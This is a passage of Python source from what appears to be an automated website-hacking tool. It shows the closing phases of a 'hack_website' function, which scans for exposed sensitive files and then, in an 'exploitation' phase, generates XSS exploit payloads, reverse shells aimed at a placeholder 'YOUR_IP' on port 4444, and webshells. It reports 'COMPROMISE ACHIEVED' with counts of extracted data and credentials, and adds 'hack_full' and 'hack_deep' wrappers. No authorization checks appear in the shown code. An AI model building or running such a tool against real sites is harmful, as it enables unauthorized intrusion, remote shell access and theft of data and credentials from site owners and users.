    except Exception:pass

    logger.debug("  * Sensitive Files Scan...")
    try:
        sensitive = scan_for_sensitive_files(target_url)
        if sensitive:
            result["recon"]["sensitive_files"] = sensitive[:20]
            logger.debug("    ! Found " + str(len(sensitive)) + " exposed files:")
            for s in sensitive[:5]:
                logger.debug("      - " + s["path"] + " [" + str(s["status"]) + "] (" + str(s["size"]) + " bytes)")
    except Exception:pass

    # --- PHASE 5: EXPLOITATION & REPORT ---
    logger.debug("\n" + Fore.YELLOW + "[PHASE 5/5: EXPLOITATION & REPORT]" + Style.RESET_ALL)

    # Generate exploit payloads for XSS
    for v in result["vulnerabilities"]:
        if "XSS" in v.get("type", "") and v.get("parameter"):
            exploit = generate_xss_exploit(target_url, v["parameter"])
            if exploit:
                v["exploit_url"] = exploit.get("exploit_url", "")
                v["exploit_payload"] = exploit.get("payload", "")
                result["exploits"].append({"type": "XSS_EXPLOIT", "payload": exploit["payload"][:100]})

    # Generate reverse shells if RCE found
    for v in result["vulnerabilities"]:
        if "Command Injection" in str(v.get("type", "")) or "RCE" in str(v.get("type", "")):
            shells = generate_reverse_shell("YOUR_IP", "4444")
            result["shells"]["reverse_shells"] = list(shells.keys())
            break

    # Generate webshells
    webshells = generate_webshell("all")
    result["shells"]["webshell_types"] = list(webshells.keys())

    # Summary
    vuln_count = len(result["vulnerabilities"])
    exploit_count = len(result["exploits"])
    data_count = len(result["extracted_data"])
    cred_count = len(result["credentials"])

    severity = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
    for v in result["vulnerabilities"]:
        sev = v.get("severity", "MEDIUM")
        if sev in severity:
            severity[sev] += 1

    if vuln_count > 0:
        result["summary"] = ("COMPROMISE ACHIEVED: " + str(vuln_count) + " vulnerabilities (" +
            str(severity["CRITICAL"]) + "C/" + str(severity["HIGH"]) + "H/" + str(severity["MEDIUM"]) + "M), " +
            str(exploit_count) + " exploits, " + str(data_count) + " data extracts, " +
            str(len(result["recon"].get("ports", []))) + " open ports.")
        result["status"] = "COMPROMISED"
    else:
        result["summary"] = ("Scan completed. " + str(len(result["recon"].get("ports", []))) +
            " open ports, " + str(len(result["recon"].get("technologies", {}))) + " technologies detected.")
        result["status"] = "SCANNED"

    result["completed"] = datetime.now().isoformat()

    logger.debug("\n" + Fore.GREEN + "=" * 65)
    logger.debug("  MISSION COMPLETE -- " + result["status"])
    logger.debug("=" * 65 + Style.RESET_ALL)
    logger.debug("  Target: " + target_url)
    logger.debug("  Vulnerabilities: " + str(vuln_count) + " (" + str(severity["CRITICAL"]) + "C/" + str(severity["HIGH"]) + "H/" + str(severity["MEDIUM"]) + "M)")
    logger.debug("  Exploits: " + str(exploit_count) + " | Data Extracted: " + str(data_count) + " | Creds: " + str(cred_count))
    logger.debug("  Open Ports: " + str(len(result["recon"].get("ports", []))))
    logger.debug(Fore.GREEN + "=" * 65 + Style.RESET_ALL + "\n")

    return result

def hack_full(target_url):
    """Full hack process with subdomain/directory scanning."""
    return hack_website(target_url, quick=False)

def hack_deep(target_url):
    """Deep hack with maximum thoroughness."""
    return hack_website(target_url, quick=False, intense=True)
